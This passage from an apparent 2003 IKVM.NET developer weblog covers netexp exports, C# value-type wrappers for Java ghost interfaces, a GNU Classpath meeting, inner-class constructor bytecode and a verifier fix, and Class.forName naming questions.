        work on a netexp generated export of IKVM's classpath.dll, I&#160;encountered <strong><a href="http://java.sun.com/j2se/1.4.1/docs/api/java/awt/BufferCapabilities.FlipContents.html">java.awt.BufferCapabilities.FlipContents</a></strong>.
        This public (inner) class has non-public base class (java.awt.AttributeValue). What
        kind of a bizarre design is that?
    </p>
    <p>
        I had never realised that the Java language allowed this. Fortunately, the C# designers
        didn't make the same mistake.
    </p>
    <p>
        Note that a similar issue exists for fields (and method arguments). In Java it is
        legal to have a public field of a non-public type, or a public method that takes an
        argument of a non-public type. C# prohibits both of these.
    </p>
    <p>
        I fixed netexp to export non-public base classes (and I should do the same for interfaces,
        fields and method arguments/return type).
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/22/2003 18:36:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e4030347-e4db-4caa-8b2e-81d31197fef3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e4030347-e4db-4caa-8b2e-81d31197fef3">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 17 October 2003</h2></div>
<div class="newsItems"><a name="a4a4bcc69-174f-40af-bb16-85227b87acc0"></a><div class="entry">
	<h3 class="entryTitle">Ghosts</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        It took a bit longer than I anticipated, but I finally managed to put together a new
        snapshot and check in the changes I made in last month and a half. 
    </p>
    <p>
        What's new? 
    </p>
    <ul>
        <li>
            Fixed bug in class load failure diagnostics code. 
        </li>
        <li>
            Instead of having a single Type property on TypeWrapper, we now have different properties
            for different usages. I already know this isn't the final way I'm going to handle
            things, but for now it is a nice improvement that makes it easier to treat types differently
            based on where they are appearing (e.g. field, local, argument, base type). 
        </li>
        <li>
            Simple ghost references are translated as value type wrappers. See below for details. 
        </li>
        <li>
            Reflection support for ghost types. 
        </li>
        <li>
            Fixed a few ILGenerator.Emit() bugs where incorrect argument types were passed (int
            instead of short or byte). 
        </li>
        <li>
            Added a NoPackagePrefixAttribute to allow .NET types to not be prefixed with the "cli"
            prefix. (Suggested by Stuart Ballard) 
        </li>
        <li>
            Fix to prevent non-public delegates from being visible. 
        </li>
        <li>
            Several&#160;fixes in the handling of unloadable types. 
        </li>
        <li>
            Fixed&#160;java.lang.Comparable interface and method attributes to be identitical
            to the real interface. 
        </li>
        <li>
            Fixed java.lang.Runtime.exec() support for quoted arguments. 
        </li>
    </ul>
    <p>
        <strong>Ghost References</strong> 
    </p>
    <p>
        First of all, why did I feel the need to change it? Imagine that java.lang.StringBuffer
        had the following methods: 
    </p>
    <p>
        public void append(Object o) { ... }<br />
        public void append(CharSequence cs) { ... } 
    </p>
    <p>
        Previously, CharSequence would be&#160;erased to Object, so you'd have two methods
        with an identical signature, thus requiring name mangling. Using the method from C#
        would become very inconvenient, both because of the unexpected name, but also because
        of the fact that it isn't at all clear what argument type is expected (and passing
        an incorrect type will give odd results, like ClassCastException or IncompatibleClassChangeError). 
    </p>
    <p>
        Enter the value type wrapper. Here is how the java.lang.CharSequence interface is
        compiled now (pseudo code): 
    </p>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: Courier New; BACKGROUND-COLOR: #f0f0f0"><font color="#0000ff">public
        struct</font><font size="2"> </font><b><font color="#000080" size="2">CharSequence </font></b><font size="2">{<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">interface</font><font size="2"> __Interface
        {<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; char</font><font size="2"> charAt(</font><font color="#0000ff" size="2">int</font><font size="2"> i);<br />
        </font><font color="#008000" size="2">&#160;&#160;&#160; // ... other methods ...<br />
        </font><font size="2">&#160; }<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">object</font><font size="2"> __ref;<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">static</font><font size="2"> </font><b><font color="#000080" size="2">CharSequence </font></b><font size="2">Cast(</font><font color="#0000ff" size="2">object</font><font size="2"> o)
        {<br />
        </font><b><font color="#000080" size="2">&#160;&#160;&#160; CharSequence </font></b><font size="2">s;<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; if</font><font size="2">(o </font><font color="#0000ff" size="2">is</font><font size="2"> </font><font color="#0000ff" size="2">string</font><font size="2">)
        {<br />
        &#160;&#160;&#160;&#160;&#160; s.__ref = o;<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160;&#160;&#160; return</font><font size="2"> s;<br />
        &#160;&#160;&#160; }<br />
        &#160;&#160;&#160; s.__ref = (__Interface)o;<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; return</font><font size="2"> s;<br />
        &#160; }<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">static</font><font size="2"> </font><font color="#0000ff" size="2">bool</font><font size="2"> IsInstance(</font><font color="#0000ff" size="2">object</font><font size="2"> o)
        {<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; return</font><font size="2"> o </font><font color="#0000ff" size="2">is</font><font size="2"> </font><font color="#0000ff" size="2">string</font><font size="2"> ||
        o </font><font color="#0000ff" size="2">is</font><font size="2"> __Interface;<br />
        &#160; }<br />
        </font><font color="#0000ff" size="2">&#160;&#160;public</font><font size="2"> </font><font color="#0000ff" size="2">object</font><font size="2"> ToObject()
        {<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; return</font><font size="2"> __ref;<br />
        &#160; }<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">static</font> 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: Courier New; BACKGROUND-COLOR: #f0f0f0"><font color="#0000ff">&#160;&#160; </font><font size="2">&#160;</font><font color="#0000ff" size="2">implicit</font><font size="2"> </font><font color="#0000ff" size="2">operator</font><font size="2"> </font><b><font color="#000080" size="2">CharSequence</font></b><font size="2">(</font><font color="#0000ff" size="2">string</font><font size="2"> s)
        {<br />
        </font><b><font color="#000080" size="2">&#160;&#160;&#160; CharSequence </font></b><font size="2">seq;<br />
        &#160;&#160;&#160; seq.__ref = s;<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; return</font><font size="2"> seq;<br />
        &#160; }<br />
        </font><font color="#0000ff" size="2">&#160; public</font><font size="2"> </font><font color="#0000ff" size="2">char</font><font size="2"> charAt(</font><font color="#0000ff" size="2">int</font><font size="2"> i)
        {<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; if</font><font size="2">(__ref </font><font color="#0000ff" size="2">is</font><font size="2"> </font><font color="#0000ff" size="2">string</font><font size="2">)
        {<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160;&#160;&#160; return</font><font size="2"> StringHelper.charAt((</font><font color="#0000ff" size="2">string</font><font size="2">)__ref,
        i);<br />
        &#160;&#160;&#160; }<br />
        </font><font color="#0000ff" size="2">&#160;&#160;&#160; return</font><font size="2"> ((__Interface)__ref).charAt(i);<br />
        &#160; }<br />
        </font><font color="#008000" size="2">&#160; // ... other methods ...<br />
        </font><font size="2">}</font> 
    </div>
    <p>
        <br />
        All types that implement CharSequence will be compiled to implement CharSequence.__Interface
        and will also get an implicit conversion operator to convert to CharSequence. This
        allows C# code to easily call any methods that&#160;take a CharSequence argument,
        because any valid type will be implicitly convertible to the CharSequence value type. 
    </p>
    <p>
        <strong>What Are The Downsides?</strong> 
    </p>
    <p>
        There are a few cons: 
    </p>
    <ul>
        <li>
            This trick doesn't work for arrays. So a CharSequence[] is still compiled as Object[].
            Hopefully arrays are far less common, so this will not be a big issue. 
        </li>
        <li>
            C# code implementing CharSequence, needs to implement CharSequence.__Interface and
            also needs to provide an implicit conversion operator to the CharSequence value type. 
        </li>
        <li>
            The static methods Cast and IsInstance need to be used instead of the normal language
            features. 
        </li>
        <li>
            It is very easy to accidentally box the CharSequence value type in C#, when you pass
            this to Java things will get very confusing. The proper way to convert CharSequence
            to Object is by calling ToObject() on it. 
        </li>
    </ul>
    <p>
        <strong>Update: </strong>I forgot to mention that the reason that you have to implement
        the implicit conversion on all types that implement the interface is because C# doesn't
        allow implicit conversion from/to interfaces, otherwise the CharSequence value type
        could just have an implicit conversion from CharSequence.__Interface and we'd be done.
        Funnily enough, while C# doesn't allow you to define them, it turns out it does consume
        them, but I don't know if this is guaranteed behavior or a bug. I need to find this
        out. If it turns out to be correct, then I'll add the implicit conversion operator
        to the value types, that makes life for C# implementers a tiny bit easier.
    </p>
    <p>
        All in all, I think this is an improvement, but obviously not perfect. As always,
        feedback is appreciated. 
    </p>
    <p>
        The new snapshots: <a href="http://www.frijters.net/ikvmbin.zip">binaries</a>&#160;and <a href="http://www.frijters.net/ikvm.zip">complete</a>. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/17/2003 15:57:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4a4bcc69-174f-40af-bb16-85227b87acc0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4a4bcc69-174f-40af-bb16-85227b87acc0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 16 October 2003</h2></div>
<div class="newsItems"><a name="ac69de097-f0a3-4018-9ba7-f04f6f743d46"></a><div class="entry">
	<h3 class="entryTitle">GNU Classpath Meeting</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        We had a small GNU Classpath meeting on Tuesday at the <a href="http://www.linux-kongress.org/2003/index.html">Linux
        Kongress</a> in Saarbrücken, Germany. I drove down there for just that day. There
        were 6 others there: <a href="http://www.advogato.org/person/robilad/">Dalibor Topic</a> (<a href="http://www.kaffe.org/">Kaffe</a>), <a href="http://www.acunia.com/wonka/005_coreteam.php">Chris
        Gray</a> (<a href="http://wonka.acunia.com/">Wonka</a>), <a href="http://klomp.org/mark/">Mark
        Wielaard</a> (<a href="http://www.gnu.org/software/classpath/">GNU Classpath</a>), <a href="http://www.dandelis.ch/people/brawer/">Sascha
        Brawer</a> (<a href="http://www.gnu.org/software/classpath/">GNU Classpath</a>), <a href="http://www.lri.fr/~fekete/">Jean
        Daniel Fekete</a> (<a href="http://www.cs.umd.edu/hcil/agile2d/">Agile2D</a>), <a href="http://www.reali.ch/~patrik/">Patrik
        Reali</a> (<a href="http://www.oberon.ethz.ch/jaos/">JAOS</a>).
    </p>
    <p>
        I enjoyed it very much. The discussions were interesting and it was nice to finally
        meet some of the people involved with GNU Classpath.
    </p>
    <p>
        We talked about how to implement Java2D. Jean Daniel has worked on Agile2D a Java2D
        implementation based on OpenGL. This is a nice starting point and OpenGL is available
        on virtually every platform. This would work for IKVM.NET as well. Sascha pointed
        out that I should really implement Java2D on top of the .NET System.Drawing classes
        (based on GDI+). That would be cool, but I think it would be too much work (for me).
    </p>
    <p>
        I also had an interesting discussion with Patrik about JAOS, a JVM on top of Oberon
        (a sort of&#160;object oriented OS, if I understand it correctly). He faces some of
        the same problems as I do, with the integration of the two object models.
    </p>
    <p>
        One of the conclusions of the meeting was that GNU Classpath is alive and kicking
        (and doing very well in terms of progress being made), but we need a little more publicity.
        So consider this my small drop in the bucket. If you are a Java developer and want
        to improve the state of free JVMs, please visit the <a href="http://www.gnu.org/software/classpath/">GNU
        Classpath</a> web site and consider helping out. In the near future there will be
        a new task list detailing some of the work that needs to be done (and it will include
        estimated required effort and skill set).
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/16/2003 14:36:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c69de097-f0a3-4018-9ba7-f04f6f743d46"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c69de097-f0a3-4018-9ba7-f04f6f743d46">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 03 October 2003</h2></div>
<div class="newsItems"><a name="af1cbf709-aff4-4366-a2b3-33c8ded017cf"></a><div class="entry">
	<h3 class="entryTitle">Vacation</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I'm going on vacation again :-) I'll be back on the 12th.
    </p>
    <p>
        I just realised I haven't blogged for a whole month. It's not because there hasn't
        been any progress. I've been experimenting with a way to make ghost interfaces more
        usable from other languages. More on that when I get back.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/03/2003 21:53:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f1cbf709-aff4-4366-a2b3-33c8ded017cf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f1cbf709-aff4-4366-a2b3-33c8ded017cf">Comments [8]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 September 2003</h2></div>
<div class="newsItems"><a name="a5ecc973f-03a8-43f6-b74b-98767a6323f0"></a><div class="entry">
	<h3 class="entryTitle">Constructing Inner Classes</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Alan Macek <a href="http://sourceforge.net/mailarchive/message.php?msg_id=5925595">pointed
        out</a> an interesting bug in the verifier. 
    </p>
    <p>
        First, some background. Let's look at this code fragment: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: Courier New">class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New"> Test
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; Test()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Runnable()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        &#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">void</span> run()
        {}</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        };</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">static</span> <span style="COLOR: blue">void</span> main(String[]
        args) {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Test();</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">}</span> 
        <br />
    </div>
    <p>
        Inner classes aren't supported by the VM, it's a compiler fiction, so when you compile
        the above code you get the equivalent of the following: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: Courier New">class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New"> Test
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; Test()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Test$1(<span style="COLOR: blue">this</span>);</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">static</span> <span style="COLOR: blue">void</span> main(String[]
        args) {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Test();</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">}</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;</span> 
        <br />
        <span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: Courier New">class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New"> Test$1 <span style="COLOR: blue">implements</span> Runnable
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; <span style="COLOR: blue">private</span> Test
        outer;</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; Test$1(Test
        outer) {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">this</span>.outer
        = outer;</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">void</span> run()
        {}</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">}</span> 
        <br />
    </div>
    <p>
        The interesting bit here is that the outer field is initialized after the base class
        constructor runs. In this case the base class is Object so this isn't significant,
        but when you have a base class that calls virtual methods it is: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: Courier New">abstract</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New"> <span style="COLOR: blue">class</span> Base
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; Base()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        run();</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160; &#160;<span style="COLOR: blue">public</span> <span style="COLOR: blue">abstract</span> <span style="COLOR: blue">void</span> run();</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">}</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;</span> 
        <br />
        <span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: Courier New">class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New"> Test
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; Test()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Base()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        &#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">void</span> run()
        {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
        System.out.println(Test.<span style="COLOR: blue">this</span>);</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        &#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160;
        };&#160;&#160;&#160; </span>
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; <span style="COLOR: blue">public</span> <span style="COLOR: blue">static</span> <span style="COLOR: blue">void</span> main(String[]
        args) {</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160;&#160;&#160; <span style="COLOR: blue">new</span> Test();</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">&#160;&#160;&#160; }</span> 
        <br />
        <span style="FONT-SIZE: 10pt; FONT-FAMILY: Courier New">}</span> 
        <br />
    </div>
    <p>
        When you compile this and run it, it prints out: null. The outer this reference is
        not yet initialized when the Base constructor runs. 
    </p>
    <p>
        However, when you compile it with the <b>-target 1.4</b> option, it prints out: Test@17182c1
        (or something similar). So clearly an interesting change was made to the compiler. 
    </p>
    <p>
        Let's take a look at the bytecode of the constructor of the original code fragment: 
    </p>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: Courier New; BACKGROUND-COLOR: #f7f7b0"><b>&lt;init&gt;(LTest;)V<br />
        0&#160; aload_0<br />
        1&#160; invokespecial java/lang/Object/&lt;init&gt;()V<br />
        4&#160; aload_0<br />
        5&#160; aload_1<br />
        6&#160; putfield Test$1/this$0 Test<br />
        9&#160; return<br />
        </b>
    </div>
    <p>
        First, the base class constructor is called and then the this$0 field is initialized. 
    </p>
    <p>
        Now take a look at the same method, but now as compiled with the&#160;<b>-target 1.4</b> option: 
    </p>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: Courier New; BACKGROUND-COLOR: #f7f7b0"><b>&lt;init&gt;(LTest;)V<br />
        0&#160; aload_0<br />
        1&#160; aload_1<br />
        2&#160; putfield Test$1/this$0 Test<br />
        5&#160; aload_0<br />
        6&#160; invokespecial java/lang/Object/&lt;init&gt;()V<br />
        9&#160; return<br />
        </b>
    </div>
    <p>
        The order of the two steps is reversed. Now it first initializes the this$0 field
        and then calls the base class constructor. 
    </p>
    <p>
        I had missed the fact that it is legal to initialize fields in an unitialized object.
        So when the latter code was run, the verifier compiled that an uninitialized object
        reference was used. 
    </p>
    <p>
        The big question is why the compiler only does this when the <b>-target 1.4</b> option
        is specified. This rule of allowing instance fields of unitialized object to be written
        has always been in the JVM specification, as far as I can tell. 
    </p>
    <p>
        <b>New Snapshots</b>
    </p>
    <p>
        Friday, I put up new snapshots. <a href="http://www.frijters.net/ikvm.zip">Source
        and binaries</a> and <a href="http://www.frijters.net/ikvmbin.zip">binaries only</a>. 
    </p>
    <p>
        Changes since the last (on the blog announced) snapshot: 
    </p>
    <ul style="MARGIN-TOP: 0in" type="disc">
        <li>
            New version of netexp based on Java reflection (all .NET to Java mapping is now in
            the IKVM reflection runtime). 
        </li>
        <li>
            To support netexp, the .NET type reflection is now much better. This includes support
            for delegates and byref arguments. Instead of lower casing the .NET namespaces, all
            .NET types are now prefixed with the "cli." package name. Remapped this are also available
            and appear as final classes without constructors, but with static methods for all
            instance methods (taking the remapped type as the first argument). Constructors are
            available as static __new methods. 
        </li>
        <li>
            Bootstrap class loader is now a flat type space. All loaded assemblies are searched
            for bootstrap types when Class.forName is used. 
        </li>
        <li>
            Enums are now treated as other value types (i.e. boxed). This allows better accesses
            to overloaded .NET methods. 
        </li>
        <li>
            Lots of clean up and refactoring to support the new reflection capabilities. 
        </li>
        <li>
            Various bug fixes. 
        </li>
        <li>
            Updated to work with latest GNU Classpath CVS. 
        </li>
    </ul>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/01/2003 16:32:56 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5ecc973f-03a8-43f6-b74b-98767a6323f0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5ecc973f-03a8-43f6-b74b-98767a6323f0">Comments [9]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 17 August 2003</h2></div>
<div class="newsItems"><a name="af27a5e84-f8d1-4874-bc8e-2591dbbc43e4"></a><div class="entry">
	<h3 class="entryTitle">More discussion on netexp and Class.forName</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Stuart commented: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>Well, I think it's really ugly, but I've run out of better proposals ;) I have
            lots of questions and few answers - here are some...</em> 
        </p>
        <p>
            <em>Is it possible for the same class to have multiple names? (There must already
            be *some* concessions to this, because, for example, "System.Exception" is also known
            as "java.lang.Throwable" - similarly for "Object" and "String").</em> 
        </p>
    </div>
    <p>
        That's right. In general it is not possible for a class to have multiple names, but
        the three classes you name are special cases. They can have multiple names because
        Java code will never encounter instances of them (instances will always appear as
        java.lang.Object, java.lang.String and java.lang.Throwable). The IKVM reflection code
        knows this and can make it appear so that System.Object, System.String and System.Exception
        are final classes without constructors and with only static methods. That way Java
        code will be able to call (almost) all .NET methods on these types. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>I wonder if there could be some concessions for "well-known" assemblies, such
            as corlib, System, and the various System.* and Microsoft.* assemblies that ship with
            the framework.</em> 
        </p>
        <p>
            <em>How does this whole thing work with Mono which doesn't support strong names? What
            about unsigned assemblies?</em> 
        </p>
    </div>
    <p>
        It really isn't about strong names. The real issue is that in Java class&#160;identities
        are resolved based on the class name and class loader hierarchy, while in .NET type
        identities are resolved based on type name, assembly name and&#160;binding policy.
        Those two models are very different and the trick is to find a way to map one onto
        the other. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>How does this "round-trip"? In other words, if I use ikvmc to compile some Java
            code into a .NET DLL, use netexp to export that DLL, and try to use its classes, do
            I now need to fully-qualify them?</em> 
        </p>
    </div>
    <p>
        No, you wouldn't need to fully qualify them, but you would need to make sure that
        the first DLL gets loaded into the AppDomain before you do any Class.forName() on
        it. This is essentially the problem I'm trying to solve for .NET types, but for round-tripped
        code I don't think it is solvable. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>I guess my primary feeling is that all these solutions seem to make things worse
            than they currently are, where for the *most* part things "just work", and I don't
            have to understand strong naming or any of the other details of the .NET assembly
            loading model to be able to seamlessly interoperate between the two languages. I wish
            there were some way to solve the internal issues while still preserving that niceness-to-use.</em> 
        </p>
    </div>
    <p>
        I agree. Also my previous proposal also has a problem, for one thing, it still has
        problems with assembly versioning. If you run on a later version of the .NET framework
        the system assembly version no longer match the ones in the Java class name and thus
        Class.getName() will return a different name then the one used to load the class. 
    </p>
    <p>
        Obmoloc wrote: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>A agree with Stuart. I think that the following code must work always:<br />
            <br />
            assert Class.forName(x).getName() == x.intern();</em> 
        </p>
    </div>
    <p>
        Assuming you mean: Class.forName(x).getName().equals(x), I agree, but that is the
        easy one, it should also hold that&#160;for a Class c with a no-arg constructor: c.newInstance().getClass()
        == c 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>Given that, Class.forName("NET.System.String") should throw a ClassNotFoundException,
            as for Class.forName("NET.System.Exception"), and for Class.forName("NET.System.Object").<br />
            <br />
            I believe that there is little or no need to call those methods, and so to import
            such classes.</em> 
